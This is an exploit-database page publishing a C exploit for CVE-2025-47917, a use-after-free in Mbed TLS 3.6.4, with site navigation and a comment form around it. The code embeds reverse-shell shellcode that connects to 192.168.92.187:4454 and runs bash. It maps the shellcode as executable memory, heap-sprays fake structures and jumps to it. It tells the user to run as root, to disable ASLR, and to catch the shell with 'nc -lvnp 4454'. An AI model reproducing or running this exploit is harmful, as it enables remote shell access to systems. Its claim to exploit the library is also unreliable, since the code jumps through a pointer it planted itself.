---
title: Mbed TLS 3.6.4 Use-After-Free
url: https://cxsecurity.com/issue/WLB-2025120009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-09
fetch_date: 2025-12-10T03:19:48.212520
---

# Mbed TLS 3.6.4 Use-After-Free

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Mbed TLS 3.6.4 Use-After-Free** **2025.12.09**  Credit:  **[Byte Reaper](https://cxsecurity.com/author/Byte%2BReaper/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-47917](https://cxsecurity.com/cveshow/CVE-2025-47917/ "Click to see CVE-2025-47917")**  CWE: **N/A** | |

/\*
\* Exploit Title: Mbed TLS 3.6.4 - Use-After-Free
\* Google Dork: N/A
\* Date: 2025-08-29
\* Exploit Author: Byte Reaper
\* Vendor Homepage: https://github.com/Mbed-TLS/mbedtls
\* Software Link: https://github.com/Mbed-TLS/mbedtls
\* Version: ≤ 3.6.4
\* Tested on: Kali Linux
\* CVE: CVE-2025-47917
\*/
#include<stdio.h>
#include<string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include "mbedtls/asn1.h"
#include <mbedtls/x509.h>
#include <mbedtls/x509\_crt.h>
#include <mbedtls/oid.h>
#include <malloc.h>
#define \_GNU\_SOURCE
typedef struct
{
unsigned char \*pointer;
size\_t pointerLen;
}shell;
typedef struct fake\_named\_data
{
struct fake\_named\_data \*next;
mbedtls\_asn1\_buf oid;
mbedtls\_asn1\_buf val;
} fake\_named\_data;
void eS()
{
\_\_asm\_\_ volatile
(
"xor %%rdi, %%rdi\n\t"
"mov $0x3C, %%rax\n\t"
"syscall\n\t"
:
:
:"rax", "rdi"
);
}
void checkAslr()
{
FILE \*f = fopen("/proc/sys/kernel/randomize\_va\_space", "r");
if (!f)
{
perror("\e[1;31m[-] Error Open File !");
eS();
}
int val;
if (fscanf(f,
"%d",
&val) != 1)
{
printf("\e[1;31m[-] Failed to read ASLR status.\e[0m\n");
fclose(f);
eS();
}
fclose(f);
if (val != 0)
{
printf("\e[1;31m[-] ASLR is enabled (value=%d). This may prevent reliable exploitation.\e[0m\n", val);
printf("[\e[1;31m-] Please disable ASLR temporarily using: echo 0 | sudo tee /proc/sys/kernel/randomize\_va\_space\n");
printf("\e[1;31m[-] Exiting to avoid crash.\e[0m\n");
eS();
}
printf("\e[1;36m[+] ASLR is disabled (value=0). Environment looks good.\e[0m\n");
}
shell inject()
{
// ip : 192.168.92.187
// port : 4454
unsigned char shellcode[] =
{
0x48, 0x31, 0xd2, 0xb8, 0x29, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00,
0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x49,
0x89, 0xc4, 0x48, 0x83, 0xec, 0x10, 0xc7, 0x44, 0x24, 0x0c, 0xbd, 0x5c,
0xa8, 0xc0, 0x66, 0xc7, 0x44, 0x24, 0x0a, 0x11, 0xc1, 0x66, 0xc7, 0x44,
0x24, 0x08, 0x02, 0x00, 0x48, 0x89, 0xe6, 0xba, 0x10, 0x00, 0x00, 0x00,
0xb8, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x4c, 0x89, 0xe7, 0xbe, 0x02,
0x00, 0x00, 0x00, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xff,
0xce, 0x79, 0xf4, 0x48, 0x31, 0xd2, 0x48, 0xb8, 0x62, 0x2f, 0x73, 0x62,
0x61, 0x73, 0x68, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f,
0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6,
0xb8, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
};
size\_t shellcodeLen = sizeof(shellcode);
shell a =
{
shellcode,
shellcodeLen
};
void \*page = mmap(NULL, a.pointerLen,
PROT\_READ|PROT\_WRITE|PROT\_EXEC,
MAP\_ANON|MAP\_PRIVATE, -1, 0);
memcpy(page, a.pointer, a.pointerLen);
a.pointer = page;
return a;
}
void paddingChunk(void \*fakeP, size\_t len)
{
for (int i = 0; i < 10000; i++)
{
void \*p = malloc(len);
size\_t usable = malloc\_usable\_size(p);
memcpy(p, fakeP, len);
memset((char\*)p + len, 0, usable - len);
}
}
void pointerHead(mbedtls\_asn1\_named\_data \*head)
{
if (head->val.p == NULL)
{
printf("\e[1;91m[-] Pointer ShellCode Is NULl !!\e[0m\n");
eS();
}
printf("\e[1;36m[\*] Jumping to shellcode at %p\e[0m\n", head->val.p);
void (\*u)() = (void(\*)()) head->val.p;
u();
}
void tls()
{
mbedtls\_asn1\_named\_data \*head = NULL;
printf("\e[1;34m[+] Create Head Successfully !\e[0m\n");
printf("\e[1;35m[\*] head before first call: %p\e[0m\n", head);
int value = mbedtls\_x509\_string\_to\_names(&head, "CN=AAAA");
shell a = inject();
void \*exec\_mem = a.pointer;
fake\_named\_data data =
{
.next = NULL,
.oid =
{
.p = (unsigned char\*) MBEDTLS\_OID\_AT\_CN,
.len = sizeof(MBEDTLS\_OID\_AT\_CN) - 1 },
.val =
{
.p = a.pointer,
.len = a.pointerLen
}
};
printf("\e[1;35m[\*] head after first call: %p (value=%d)\e[0m\n", head, value);
paddingChunk(&data, sizeof(mbedtls\_asn1\_named\_data));
printf("\e[1;34m[+] Use heap spray...\e[0m\n");
usleep(500000);
if (value == MBEDTLS\_ERR\_X509\_INVALID\_NAME)
{
printf("\e[1;31m[-] Invaild Name (Med Tls Name)!\e[0m\n");
printf("[\e[1;31m-] Value => (MBEDTLS\_ERR\_X509\_INVALID\_NAME)\e[0m\n");
printf("\e[1;31m[-] Exit (sys\_exit)...\e[0m\n");
eS();
}
printf("\e[1;35m[\*] head before second call: %p\e[0m\n", head);
int value2 = mbedtls\_x509\_string\_to\_names(&head, "CN=AAAA,CN=BBBB");
printf("\e[1;35m[\*] head after second call: %p (value=%d)\e[0m\n", head, value2);
printf("\e[1;34m[+] Successfully Create String Name.\e[0m\n");
pointerHead(head);
printf("\e[1;34m[+] Jump Shellcode Pointer ...\e[0m\n");
printf("\e[1;34m[+] Pointer Shellcode : %p\e[0m\n", a.pointer);
printf("\e[1;34m[+] Shellcode Injection Successfully !\e[0m\n");
printf("\e[1;34m[+] Shellcode Len : %zu\e[0m\n", a.pointerLen);
printf("\e[1;33m[+] Please Check Reverse shell (nc -lvnp 4454)\e[0m\n");
printf("\e[1;34m[+] Success Free Head !\e[0m\n");
}
int main()
{
printf("\e[0;95m+-------------------------------------------------+\e[0m\n");
printf("\e[0;95m|\e[0m \e[1;37mByte Reaper\e[0m \e[0;95m|\e[0m\n");
printf("\e[0;95m|\e[0m \e[1;33mExploit: CVE-2025-47917\e[0m \e[0;95m|\e[0m\n");
printf("\e[0;95m|\e[0m \e[1;31mVulnerability: UAF\e[0m \e[0;95m|\e[0m\n");
printf("\e[0;95m+-------------------------------------------------+\e[0m\n");
if (getuid() != 0)
{
printf("\e[1;31m[-] Please Run exploit in Root (sudo ./exploit)\n");
eS();
}
checkAslr();
tls();
return 0;
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Sho...